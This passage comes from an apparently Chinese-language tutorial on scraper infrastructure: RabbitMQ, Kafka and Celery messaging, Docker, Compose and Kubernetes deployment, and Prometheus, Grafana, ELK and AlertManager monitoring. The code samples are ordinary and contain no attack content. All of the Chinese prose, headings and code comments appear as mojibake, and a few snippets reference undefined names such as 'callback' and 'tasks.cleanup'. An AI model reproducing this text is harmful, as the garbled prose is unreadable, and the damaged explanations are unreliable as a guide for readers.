<li><strong>Producer</strong>: ç”Ÿäº§è€…ï¼Œå‘é€æ¶ˆæ¯</li>
<li><strong>Consumer</strong>: æ¶ˆè´¹è€…ï¼Œæ¥æ”¶æ¶ˆæ¯</li>
<li><strong>Exchange</strong>: äº¤æ¢æœºï¼Œè·¯ç”±æ¶ˆæ¯</li>
<li><strong>Queue</strong>: é˜Ÿåˆ—ï¼Œå­˜å‚¨æ¶ˆæ¯</li>
<li><strong>Binding</strong>: ç»‘å®šï¼ŒExchange å’Œ Queue çš„å…³ç³»</li>
</ul>
<h3>å®‰è£…å¯åŠ¨</h3>
<pre><code class="language-bash"># Docker å¯åŠ¨
docker run -d --name rabbitmq \
  -p 5672:5672 \
  -p 15672:15672 \
  rabbitmq:3-management

# è®¿é—®ç®¡ç†ç•Œé¢
# http://localhost:15672
# é»˜è®¤è´¦å·: guest/guest
</code></pre>
<h3>Python å®¢æˆ·ç«¯</h3>
<pre><code class="language-python">import pika
import json

class RabbitMQClient:
    def __init__(self, host='localhost'):
        self.connection = pika.BlockingConnection(
            pika.ConnectionParameters(host=host)
        )
        self.channel = self.connection.channel()

    def declare_queue(self, queue_name):
        &quot;&quot;&quot;å£°æ˜é˜Ÿåˆ—&quot;&quot;&quot;
        self.channel.queue_declare(
            queue=queue_name,
            durable=True  # æŒä¹…åŒ–
        )

    def publish(self, queue_name, message):
        &quot;&quot;&quot;å‘å¸ƒæ¶ˆæ¯&quot;&quot;&quot;
        self.channel.basic_publish(
            exchange='',
            routing_key=queue_name,
            body=json.dumps(message),
            properties=pika.BasicProperties(
                delivery_mode=2,  # æ¶ˆæ¯æŒä¹…åŒ–
            )
        )

    def consume(self, queue_name, callback):
        &quot;&quot;&quot;æ¶ˆè´¹æ¶ˆæ¯&quot;&quot;&quot;
        self.channel.basic_qos(prefetch_count=1)
        self.channel.basic_consume(
            queue=queue_name,
            on_message_callback=callback
        )
        self.channel.start_consuming()

    def close(self):
        self.connection.close()

# ç”Ÿäº§è€…
producer = RabbitMQClient()
producer.declare_queue('urls')
producer.publish('urls', {'url': 'https://example.com', 'depth': 0})

# æ¶ˆè´¹è€…
def process_url(ch, method, properties, body):
    message = json.loads(body)
    print(f&quot;Processing: {message['url']}&quot;)
    # å¤„ç†å®Œæˆåç¡®è®¤
    ch.basic_ack(delivery_tag=method.delivery_tag)

consumer = RabbitMQClient()
consumer.consume('urls', process_url)
</code></pre>
<h3>Topic Exchange ç¤ºä¾‹</h3>
<pre><code class="language-python">class TopicExchangeClient:
    def __init__(self):
        self.connection = pika.BlockingConnection(
            pika.ConnectionParameters('localhost')
        )
        self.channel = self.connection.channel()

        # å£°æ˜ Topic Exchange
        self.channel.exchange_declare(
            exchange='scraper_topics',
            exchange_type='topic',
            durable=True
        )

    def publish_with_routing(self, routing_key, message):
        &quot;&quot;&quot;å‘å¸ƒå¸¦è·¯ç”±çš„æ¶ˆæ¯&quot;&quot;&quot;
        self.channel.basic_publish(
            exchange='scraper_topics',
            routing_key=routing_key,
            body=json.dumps(message)
        )

    def subscribe_pattern(self, pattern, callback):
        &quot;&quot;&quot;è®¢é˜…ç¬¦åˆæ¨¡å¼çš„æ¶ˆæ¯&quot;&quot;&quot;
        result = self.channel.queue_declare('', exclusive=True)
        queue_name = result.method.queue

        self.channel.queue_bind(
            exchange='scraper_topics',
            queue=queue_name,
            routing_key=pattern
        )

        self.channel.basic_consume(
            queue=queue_name,
            on_message_callback=callback,
            auto_ack=True
        )
        self.channel.start_consuming()

# ä½¿ç”¨
client = TopicExchangeClient()

# å‘å¸ƒä¸åŒç±»å‹çš„æ¶ˆæ¯
client.publish_with_routing('news.tech', {'title': 'Tech News'})
client.publish_with_routing('news.sports', {'title': 'Sports News'})
client.publish_with_routing('video.movie', {'title': 'Movie Title'})

# è®¢é˜…æ‰€æœ‰æ–°é—»
client.subscribe_pattern('news.*', callback)

# è®¢é˜…æ‰€æœ‰æ¶ˆæ¯
client.subscribe_pattern('#', callback)
</code></pre>
<hr />
<h2>Kafka</h2>
<h3>é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>å¤§è§„æ¨¡æ—¥å¿—æ”¶é›†</li>
<li>å®æ—¶æ•°æ®æµå¤„ç†</li>
<li>é«˜ååé‡æ¶ˆæ¯ä¼ é€’</li>
</ul>
<h3>å¯åŠ¨ Kafka</h3>
<pre><code class="language-bash"># Docker Compose
version: '3'
services:
  zookeeper:
    image: confluentinc/cp-zookeeper:latest
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181

  kafka:
    image: confluentinc/cp-kafka:latest
    depends_on:
      - zookeeper
    ports:
      - &quot;9092:9092&quot;
    environment:
      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://localhost:9092
      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1
</code></pre>
<h3>Python å®¢æˆ·ç«¯</h3>
<pre><code class="language-python">from kafka import KafkaProducer, KafkaConsumer
import json

class KafkaClient:
    def __init__(self, bootstrap_servers='localhost:9092'):
        self.bootstrap_servers = bootstrap_servers

    def get_producer(self):
        &quot;&quot;&quot;è·å–ç”Ÿäº§è€…&quot;&quot;&quot;
        return KafkaProducer(
            bootstrap_servers=self.bootstrap_servers,
            value_serializer=lambda v: json.dumps(v).encode('utf-8'),
            acks='all',  # ç­‰å¾…æ‰€æœ‰å‰¯æœ¬ç¡®è®¤
            retries=3
        )

    def get_consumer(self, topic, group_id='scraper-group'):
        &quot;&quot;&quot;è·å–æ¶ˆè´¹è€…&quot;&quot;&quot;
        return KafkaConsumer(
            topic,
            bootstrap_servers=self.bootstrap_servers,
            group_id=group_id,
            value_deserializer=lambda m: json.loads(m.decode('utf-8')),
            auto_offset_reset='earliest',
            enable_auto_commit=True
        )

# ç”Ÿäº§è€…
client = KafkaClient()
producer = client.get_producer()

# å‘é€æ¶ˆæ¯
for i in range(100):
    message = {'url': f'https://example.com/page/{i}', 'index': i}
    producer.send('scraper-urls', value=message)

producer.flush()
producer.close()

# æ¶ˆè´¹è€…
consumer = client.get_consumer('scraper-urls')

for message in consumer:
    data = message.value
    print(f&quot;Processing: {data['url']}&quot;)
</code></pre>
<hr />
<h2>Celery</h2>
<h3>å®‰è£…é…ç½®</h3>
<pre><code class="language-bash">pip install celery[redis]
</code></pre>
<h3>å®šä¹‰ä»»åŠ¡</h3>
<pre><code class="language-python"># tasks.py
from celery import Celery
import requests

app = Celery(
    'scraper',
    broker='redis://localhost:6379/0',
    backend='redis://localhost:6379/1'
)

app.conf.update(
    task_serializer='json',
    accept_content=['json'],
    result_serializer='json',
    timezone='Asia/Shanghai',
    enable_utc=True,
)

@app.task(bind=True, max_retries=3)
def scrape_url(self, url):
    &quot;&quot;&quot;çˆ¬å– URL ä»»åŠ¡&quot;&quot;&quot;
    try:
        response = requests.get(url, timeout=10)
        return {
            'url': url,
            'status_code': response.status_code,
            'content_length': len(response.content)
        }
    except Exception as exc:
        # é‡è¯•
        raise self.retry(exc=exc, countdown=60)

@app.task
def process_data(data):
    &quot;&quot;&quot;å¤„ç†æ•°æ®ä»»åŠ¡&quot;&quot;&quot;
    print(f&quot;Processing: {data}&quot;)
    return {'status': 'processed'}

# ä»»åŠ¡é“¾
@app.task
def save_to_db(result):
    &quot;&quot;&quot;ä¿å­˜åˆ°æ•°æ®åº“&quot;&quot;&quot;
    print(f&quot;Saving: {result}&quot;)
    return {'status': 'saved'}
</code></pre>
<h3>å¯åŠ¨ Worker</h3>
<pre><code class="language-bash"># å¯åŠ¨ Celery Worker
celery -A tasks worker --loglevel=info

# å¯åŠ¨å¤šä¸ª Worker
celery -A tasks worker --concurrency=10

# å¯åŠ¨ Flower (ç›‘æ§å·¥å…·)
celery -A tasks flower
</code></pre>
<h3>è°ƒç”¨ä»»åŠ¡</h3>
<pre><code class="language-python">from tasks import scrape_url, process_data, save_to_db

# å¼‚æ­¥è°ƒç”¨
result = scrape_url.delay('https://example.com')

# è·å–ç»“æœ
print(result.get(timeout=10))

# ä»»åŠ¡é“¾
from celery import chain

workflow = chain(
    scrape_url.s('https://example.com'),
    process_data.s(),
    save_to_db.s()
)
result = workflow.apply_async()

# ä»»åŠ¡ç»„ï¼ˆå¹¶è¡Œï¼‰
from celery import group

job = group([
    scrape_url.s(f'https://example.com/page/{i}')
    for i in range(10)
])
result = job.apply_async()
</code></pre>
<h3>å®šæ—¶ä»»åŠ¡</h3>
<pre><code class="language-python">from celery.schedules import crontab

app.conf.beat_schedule = {
    'scrape-every-hour': {
        'task': 'tasks.scrape_url',
        'schedule': crontab(minute=0),  # æ¯å°æ—¶æ‰§è¡Œ
        'args': ('https://example.com',)
    },
    'cleanup-every-day': {
        'task': 'tasks.cleanup',
        'schedule': crontab(hour=0, minute=0),  # æ¯å¤©å‡Œæ™¨
    },
}

# å¯åŠ¨ Beat
# celery -A tasks beat --loglevel=info
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<h3>1. æ¶ˆæ¯æŒä¹…åŒ–</h3>
<pre><code class="language-python"># é˜Ÿåˆ—æŒä¹…åŒ–
channel.queue_declare(queue='urls', durable=True)

# æ¶ˆæ¯æŒä¹…åŒ–
channel.basic_publish(
    exchange='',
    routing_key='urls',
    body=message,
    properties=pika.BasicProperties(delivery_mode=2)
)
</code></pre>
<h3>2. æ¶ˆæ¯ç¡®è®¤</h3>
<pre><code class="language-python"># æ‰‹åŠ¨ç¡®è®¤
channel.basic_consume(
    queue='urls',
    on_message_callback=callback,
    auto_ack=False  # ç¦ç”¨è‡ªåŠ¨ç¡®è®¤
)

def callback(ch, method, properties, body):
    # å¤„ç†æ¶ˆæ¯
    process(body)
    # ç¡®è®¤
    ch.basic_ack(delivery_tag=method.delivery_tag)
</code></pre>
<h3>3. é™æµæ§åˆ¶</h3>
<pre><code class="language-python"># é¢„å–æ•°é‡é™åˆ¶
channel.basic_qos(prefetch_count=1)
</code></pre>
<h3>4. æ­»ä¿¡é˜Ÿåˆ—</h3>
<pre><code class="language-python"># å£°æ˜æ­»ä¿¡é˜Ÿåˆ—
channel.queue_declare(queue='dead_letter_queue', durable=True)

# é…ç½®ä¸»é˜Ÿåˆ—
channel.queue_declare(
    queue='urls',
    durable=True,
    arguments={
        'x-dead-letter-exchange': '',
        'x-dead-letter-routing-key': 'dead_letter_queue',
        'x-message-ttl': 60000  # 60ç§’åè¿‡æœŸ
    }
)
</code></pre>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-51">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></li>
<li><a href="#section-56">ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ</a></li>
<li><a href="#section-55">Docker å®¹å™¨åŒ–éƒ¨ç½²</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-55">
                                                <h2>[R54] Docker Deployment</h2>
                                                <h1>R54: Docker å®¹å™¨åŒ–éƒ¨ç½²</h1>
<h2>æ¦‚è¿°</h2>
<p>Docker å®¹å™¨åŒ–ä½¿çˆ¬è™«é¡¹ç›®å…·å¤‡å¯ç§»æ¤æ€§ã€å¯æ‰©å±•æ€§å’Œæ˜“ç»´æŠ¤æ€§ã€‚æœ¬ç« ä»‹ç»å¦‚ä½•å°†çˆ¬è™«é¡¹ç›®å®¹å™¨åŒ–å¹¶è¿›è¡Œç”Ÿäº§éƒ¨ç½²ã€‚</p>
<hr />
<h2>Docker åŸºç¡€</h2>
<h3>æ ¸å¿ƒæ¦‚å¿µ</h3>
<ul>
<li><strong>é•œåƒ (Image)</strong>: åªè¯»æ¨¡æ¿ï¼ŒåŒ…å«è¿è¡Œåº”ç”¨æ‰€éœ€çš„ä¸€åˆ‡</li>
<li><strong>å®¹å™¨ (Container)</strong>: é•œåƒçš„è¿è¡Œå®ä¾‹</li>
<li><strong>Dockerfile</strong>: æ„å»ºé•œåƒçš„è„šæœ¬</li>
<li><strong>Docker Compose</strong>: å¤šå®¹å™¨ç¼–æ’å·¥å…·</li>
</ul>
<hr />
<h2>Dockerfile ç¼–å†™</h2>
<h3>çˆ¬è™«é¡¹ç›® Dockerfile</h3>
<pre><code class="language-dockerfile"># ä½¿ç”¨å®˜æ–¹ Python é•œåƒ
FROM python:3.11-slim

# è®¾ç½®å·¥ä½œç›®å½•
WORKDIR /app

# å®‰è£…ç³»ç»Ÿä¾èµ–
RUN apt-get update &amp;&amp; apt-get install -y \
    gcc \
    g++ \
    wget \
    &amp;&amp; rm -rf /var/lib/apt/lists/*

# å¤åˆ¶ä¾èµ–æ–‡ä»¶
COPY requirements.txt .

# å®‰è£… Python ä¾èµ–
RUN pip install --no-cache-dir -r requirements.txt

# å¤åˆ¶é¡¹ç›®ä»£ç 
COPY . .

# æš´éœ²ç«¯å£ï¼ˆå¦‚æœæœ‰ APIï¼‰
EXPOSE 8000

# è®¾ç½®ç¯å¢ƒå˜é‡
ENV PYTHONUNBUFFERED=1

# è¿è¡Œçˆ¬è™«
CMD [&quot;python&quot;, &quot;main.py&quot;]
</code></pre>
<h3>Puppeteer/Playwright Dockerfile</h3>
<p>éœ€è¦å®‰è£…æµè§ˆå™¨ä¾èµ–ï¼š</p>
<pre><code class="language-dockerfile">FROM node:18-slim

# å®‰è£… Chromium ä¾èµ–
RUN apt-get update &amp;&amp; apt-get install -y \
    chromium \
    fonts-liberation \
    libappindicator3-1 \
    libasound2 \
    libatk-bridge2.0-0 \
    libatk1.0-0 \
    libcups2 \
    libdbus-1-3 \
    libgdk-pixbuf2.0-0 \
    libnspr4 \
    libnss3 \
    libx11-xcb1 \
    libxcomposite1 \
    libxdamage1 \
    libxrandr2 \
    xdg-utils \
    &amp;&amp; rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY package*.json ./
RUN npm install

COPY . .

CMD [&quot;node&quot;, &quot;index.js&quot;]
</code></pre>
<hr />
<h2>Docker Compose</h2>
<h3>å®Œæ•´çˆ¬è™«ç³»ç»Ÿç¼–æ’</h3>
<pre><code class="language-yaml">version: &quot;3.8&quot;

services:
  # Redis
  redis:
    image: redis:7-alpine
    ports:
      - &quot;6379:6379&quot;
    volumes:
      - redis_data:/data
    restart: unless-stopped

  # MongoDB
  mongodb:
    image: mongo:6
    ports:
      - &quot;27017:27017&quot;
    environment:
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: password
    volumes:
      - mongo_data:/data/db
    restart: unless-stopped

  # çˆ¬è™« Master
  spider-master:
    build: .
    command: python master.py
    depends_on:
      - redis
      - mongodb
    environment:
      - REDIS_URL=redis://redis:6379
      - MONGO_URL=mongodb://admin:password@mongodb:27017
    restart: unless-stopped

  # çˆ¬è™« Worker
  spider-worker:
    build: .
    command: python worker.py
    depends_on:
      - redis
      - mongodb
    environment:
      - REDIS_URL=redis://redis:6379
      - MONGO_URL=mongodb://admin:password@mongodb:27017
    restart: unless-stopped
    deploy:
      replicas: 3 # å¯åŠ¨3ä¸ªWorker

volumes:
  redis_data:
  mongo_data:
</code></pre>
<h3>å¯åŠ¨å’Œç®¡ç†</h3>
<pre><code class="language-bash"># æ„å»ºé•œåƒ
docker-compose build

# å¯åŠ¨æ‰€æœ‰æœåŠ¡
docker-compose up -d

# æŸ¥çœ‹æ—¥å¿—
docker-compose logs -f spider-worker

# æ‰©å±• Worker æ•°é‡
docker-compose up -d --scale spider-worker=5

# åœæ­¢æ‰€æœ‰æœåŠ¡
docker-compose down

# åœæ­¢å¹¶åˆ é™¤å·
docker-compose down -v
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<h3>1. å¤šé˜¶æ®µæ„å»º</h3>
<p>å‡å°é•œåƒä½“ç§¯ï¼š</p>
<pre><code class="language-dockerfile"># æ„å»ºé˜¶æ®µ
FROM python:3.11 AS builder

WORKDIR /app
COPY requirements.txt .
RUN pip install --user --no-cache-dir -r requirements.txt

# è¿è¡Œé˜¶æ®µ
FROM python:3.11-slim

WORKDIR /app

# ä»æ„å»ºé˜¶æ®µå¤åˆ¶ä¾èµ–
COPY --from=builder /root/.local /root/.local
COPY . .

ENV PATH=/root/.local/bin:$PATH

CMD [&quot;python&quot;, &quot;main.py&quot;]
</code></pre>
<h3>2. ä½¿ç”¨ .dockerignore</h3>
<pre><code>__pycache__
*.pyc
*.pyo
*.pyd
.Python
.env
venv/
.git
.gitignore
*.md
.pytest_cache
.coverage
htmlcov/
</code></pre>
<h3>3. å¥åº·æ£€æŸ¥</h3>
<pre><code class="language-dockerfile">HEALTHCHECK --interval=30s --timeout=3s --retries=3 \
  CMD python -c &quot;import requests; requests.get('http://localhost:8000/health')&quot; || exit 1
</code></pre>
<h3>4. ç¯å¢ƒå˜é‡ç®¡ç†</h3>
<pre><code class="language-yaml"># docker-compose.yml
services:
  spider:
    env_file:
      - .env
</code></pre>
<pre><code class="language-bash"># .env æ–‡ä»¶
REDIS_URL=redis://redis:6379
API_KEY=your_api_key_here
PROXY_URL=http://proxy.example.com
</code></pre>
<hr />
<h2>ç”Ÿäº§éƒ¨ç½²</h2>
<h3>ä½¿ç”¨ Docker Swarm</h3>
<pre><code class="language-bash"># åˆå§‹åŒ– Swarm
docker swarm init

# éƒ¨ç½²æœåŠ¡æ ˆ
docker stack deploy -c docker-compose.yml spider

# æŸ¥çœ‹æœåŠ¡çŠ¶æ€
docker service ls

# æ‰©å±•æœåŠ¡
docker service scale spider_spider-worker=10

# åˆ é™¤æœåŠ¡æ ˆ
docker stack rm spider
</code></pre>
<h3>ä½¿ç”¨ Kubernetes</h3>
<pre><code class="language-yaml"># deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: spider-worker
spec:
  replicas: 3
  selector:
    matchLabels:
      app: spider-worker
  template:
    metadata:
      labels:
        app: spider-worker
    spec:
      containers:
        - name: spider
          image: myregistry/spider:latest
          env:
            - name: REDIS_URL
              value: &quot;redis://redis:6379&quot;
          resources:
            requests:
              memory: &quot;512Mi&quot;
              cpu: &quot;500m&quot;
            limits:
              memory: &quot;1Gi&quot;
              cpu: &quot;1000m&quot;
</code></pre>
<pre><code class="language-bash"># éƒ¨ç½²
kubectl apply -f deployment.yaml

# æ‰©å±•
kubectl scale deployment spider-worker --replicas=10

# æŸ¥çœ‹çŠ¶æ€
kubectl get pods
</code></pre>
<hr />
<h2>ç›‘æ§ä¸æ—¥å¿—</h2>
<h3>æ—¥å¿—ç®¡ç†</h3>
<pre><code class="language-yaml">services:
  spider:
    logging:
      driver: &quot;json-file&quot;
      options:
        max-size: &quot;10m&quot;
        max-file: &quot;3&quot;
</code></pre>
<h3>é›†æˆ Prometheus</h3>
<pre><code class="language-yaml">services:
  prometheus:
    image: prom/prometheus
    ports:
      - &quot;9090:9090&quot;
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus_data:/prometheus

  grafana:
    image: grafana/grafana
    ports:
      - &quot;3000:3000&quot;
    volumes:
      - grafana_data:/var/lib/grafana
</code></pre>
<hr />
<h2>å¸¸è§é—®é¢˜</h2>
<h3>Q1: å®¹å™¨å†…æ—¶åŒºä¸æ­£ç¡®ï¼Ÿ</h3>
<pre><code class="language-dockerfile">RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
RUN echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone
</code></pre>
<h3>Q2: å¦‚ä½•è°ƒè¯•å®¹å™¨å†…çš„åº”ç”¨ï¼Ÿ</h3>
<pre><code class="language-bash"># è¿›å…¥å®¹å™¨
docker exec -it container_id /bin/bash

# æŸ¥çœ‹æ—¥å¿—
docker logs -f container_id

# å®æ—¶æŸ¥çœ‹èµ„æºä½¿ç”¨
docker stats container_id
</code></pre>
<h3>Q3: å¦‚ä½•æŒä¹…åŒ–æ•°æ®ï¼Ÿ</h3>
<p>ä½¿ç”¨ Docker Volumeï¼š</p>
<pre><code class="language-yaml">services:
  spider:
    volumes:
      - spider_data:/app/data

volumes:
  spider_data:
</code></pre>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-51">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></li>
<li><a href="#section-56">ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ</a></li>
<li><a href="#section-54">æ¶ˆæ¯é˜Ÿåˆ—åº”ç”¨</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-56">
                                                <h2>[R55] Monitoring And Alerting</h2>
                                                <h1>R55: ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ</h1>
<h2>æ¦‚è¿°</h2>
<p>ç›‘æ§å’Œå‘Šè­¦æ˜¯ä¿éšœåˆ†å¸ƒå¼çˆ¬è™«ç³»ç»Ÿç¨³å®šè¿è¡Œçš„å…³é”®ã€‚æœ¬ç« ä»‹ç»å¦‚ä½•æ„å»ºå®Œæ•´çš„ç›‘æ§å’Œå‘Šè­¦ä½“ç³»ã€‚</p>
<hr />
<h2>ç›‘æ§ä½“ç³»æ¶æ„</h2>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         Scraper Nodes                â”‚
â”‚  - Metrics Exporter (Prometheus)     â”‚
â”‚  - Logging (Fluentd/Filebeat)        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”
    â”‚             â”‚
    â–¼             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Prometheusâ”‚  â”‚    ELK   â”‚
â”‚(Metrics) â”‚  â”‚  (Logs)  â”‚
â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜
     â”‚            â”‚
     â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜
            â–¼
     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     â”‚   Grafana   â”‚
     â”‚ (å¯è§†åŒ–)     â”‚
     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
            â”‚
            â–¼
     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     â”‚ AlertManagerâ”‚
     â”‚   (å‘Šè­¦)     â”‚
     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr />
<h2>Prometheus ç›‘æ§</h2>
<h3>å®‰è£…éƒ¨ç½²</h3>
<pre><code class="language-yaml"># docker-compose.yml
version: &quot;3&quot;
services:
  prometheus:
    image: prom/prometheus:latest
    ports:
      - &quot;9090:9090&quot;
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus_data:/prometheus
    command:
      - &quot;--config.file=/etc/prometheus/prometheus.yml&quot;
      - &quot;--storage.tsdb.path=/prometheus&quot;

  grafana:
    image: grafana/grafana:latest
    ports:
      - &quot;3000:3000&quot;
    volumes:
      - grafana_data:/var/lib/grafana
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin

volumes:
  prometheus_data:
  grafana_data:
</code></pre>
<h3>Prometheus é…ç½®</h3>
<pre><code class="language-yaml"># prometheus.yml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

scrape_configs:
  - job_name: &quot;scraper&quot;
    static_configs:
      - targets: [&quot;scraper:8000&quot;]

  - job_name: &quot;redis&quot;
    static_configs:
      - targets: [&quot;redis-exporter:9121&quot;]

  - job_name: &quot;mongodb&quot;
    static_configs:
      - targets: [&quot;mongodb-exporter:9216&quot;]

  - job_name: &quot;node&quot;
    static_configs:
      - targets: [&quot;node-exporter:9100&quot;]
</code></pre>
<h3>Python åº”ç”¨é›†æˆ</h3>
<pre><code class="language-python">from prometheus_client import Counter, Histogram, Gauge, start_http_server
import time

# å®šä¹‰æŒ‡æ ‡
requests_total = Counter(
    'scraper_requests_total',
    'Total number of requests',
    ['status', 'domain']
)

request_duration = Histogram(
    'scraper_request_duration_seconds',
    'Request duration in seconds',
    ['domain']
)

active_scrapers = Gauge(
    'scraper_active_workers',
    'Number of active scrapers'
)

queue_size = Gauge(
    'scraper_queue_size',
    'Size of the URL queue'
)

class MonitoredScraper:
    def __init__(self):
        # å¯åŠ¨ Prometheus HTTP æœåŠ¡å™¨
        start_http_server(8000)

    def scrape(self, url):
        &quot;&quot;&quot;çˆ¬å– URL å¹¶è®°å½•æŒ‡æ ‡&quot;&quot;&quot;
        domain = self._extract_domain(url)

        # è®°å½•æ´»è·ƒçˆ¬è™«æ•°
        active_scrapers.inc()

        try:
            # è®°å½•è¯·æ±‚æ—¶é•¿
            with request_duration.labels(domain=domain).time():
                response = requests.get(url, timeout=10)

            # è®°å½•è¯·æ±‚æ€»æ•°
            requests_total.labels(
                status=response.status_code,
                domain=domain
            ).inc()

            return response

        except Exception as e:
            requests_total.labels(status='error', domain=domain).inc()
            raise
        finally:
            active_scrapers.dec()

    def update_queue_size(self, size):
        &quot;&quot;&quot;æ›´æ–°é˜Ÿåˆ—å¤§å°&quot;&quot;&quot;
        queue_size.set(size)

    def _extract_domain(self, url):
        from urllib.parse import urlparse
        return urlparse(url).netloc
</code></pre>
<hr />
<h2>Grafana å¯è§†åŒ–</h2>
<h3>ä»ªè¡¨ç›˜é…ç½®</h3>
<pre><code class="language-json">{
  &quot;dashboard&quot;: {
    &quot;title&quot;: &quot;Scraper Monitoring&quot;,
    &quot;panels&quot;: [
      {
        &quot;title&quot;: &quot;Request Rate&quot;,
        &quot;targets&quot;: [
          {
            &quot;expr&quot;: &quot;rate(scraper_requests_total[5m])&quot;
          }
        ]
      },
      {
        &quot;title&quot;: &quot;Success Rate&quot;,
        &quot;targets&quot;: [
          {
            &quot;expr&quot;: &quot;scraper_success_rate&quot;
          }
        ]
      },
      {
        &quot;title&quot;: &quot;Queue Size&quot;,
        &quot;targets&quot;: [
          {
            &quot;expr&quot;: &quot;scraper_queue_size&quot;
          }
        ]
      },
      {
        &quot;title&quot;: &quot;P95 Response Time&quot;,
        &quot;targets&quot;: [
          {
            &quot;expr&quot;: &quot;histogram_quantile(0.95, rate(scraper_request_duration_seconds_bucket[5m]))&quot;
          }
        ]
      }
    ]
  }
}
</code></pre>
<hr />
<h2>æ—¥å¿—æ”¶é›† (ELK Stack)</h2>
<h3>Docker Compose é…ç½®</h3>
<pre><code class="language-yaml">version: &quot;3&quot;
services:
  elasticsearch:
    image: elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    ports:
      - &quot;9200:9200&quot;
    volumes:
      - es_data:/usr/share/elasticsearch/data

  logstash:
    image: logstash:8.11.0
    ports:
      - &quot;5044:5044&quot;
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf

  kibana:
    image: kibana:8.11.0
    ports:
      - &quot;5601:5601&quot;
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200

  filebeat:
    image: elastic.co/beats/filebeat:8.11.0
    volumes:
      - ./filebeat.yml:/usr/share/filebeat/filebeat.yml
      - /var/log:/var/log:ro
      - /var/lib/docker/containers:/var/lib/docker/containers:ro

volumes:
  es_data:
</code></pre>
<hr />
<h2>å‘Šè­¦é…ç½®</h2>
<h3>AlertManager é…ç½®</h3>
<pre><code class="language-yaml"># alertmanager.yml
global:
  resolve_timeout: 5m

route:
  group_by: [&quot;alertname&quot;]
  group_wait: 10s
  group_interval: 10s
  repeat_interval: 1h
  receiver: &quot;email&quot;

receivers:
  - name: &quot;email&quot;
    email_configs:
      - to: &quot;admin@example.com&quot;
        from: &quot;alertmanager@example.com&quot;
        smarthost: &quot;smtp.example.com:587&quot;
        auth_username: &quot;alertmanager@example.com&quot;
        auth_password: &quot;password&quot;

  - name: &quot;slack&quot;
    slack_configs:
      - api_url: &quot;https://hooks.slack.com/services/xxx&quot;
        channel: &quot;#alerts&quot;
        title: &quot;Scraper Alert&quot;
</code></pre>
<h3>Prometheus å‘Šè­¦è§„åˆ™</h3>
<pre><code class="language-yaml"># alerts.yml
groups:
  - name: scraper_alerts
    interval: 30s
    rules:
      # æˆåŠŸç‡å‘Šè­¦
      - alert: LowSuccessRate
        expr: scraper_success_rate &lt; 0.8
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: &quot;Success rate is low&quot;
          description: &quot;Success rate is {{ $value }}&quot;

      # é˜Ÿåˆ—å †ç§¯å‘Šè­¦
      - alert: QueueBacklog
        expr: scraper_queue_size &gt; 10000
        for: 10m
        labels:
          severity: warning
        annotations:
          summary: &quot;Queue is backing up&quot;
          description: &quot;Queue size: {{ $value }}&quot;

      # é«˜é”™è¯¯ç‡å‘Šè­¦
      - alert: HighErrorRate
        expr: rate(scraper_errors_total[5m]) &gt; 10
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: &quot;High error rate detected&quot;
          description: &quot;Error rate: {{ $value }} errors/s&quot;

      # Worker å®•æœºå‘Šè­¦
      - alert: WorkerDown
        expr: scraper_active_workers == 0
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: &quot;No active workers&quot;
</code></pre>
<hr />
<h2>å¥åº·æ£€æŸ¥</h2>
